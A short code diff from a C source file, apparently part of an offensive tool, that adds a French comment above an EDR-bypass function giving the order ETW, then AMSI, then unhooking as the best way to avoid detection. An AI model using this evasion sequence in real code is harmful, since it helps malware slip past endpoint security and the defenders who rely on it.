@@ -578,6 +578,7 @@ BOOL Evasion_DisableCLRETW(void) {
 
 /*
  * Applique toutes les techniques d'évasion EDR
+ * Ordre: ETW -> AMSI -> Unhook (optimal pour éviter la détection)
  */
 BOOL Evasion_FullBypass(void) {
     BOOL result = TRUE;
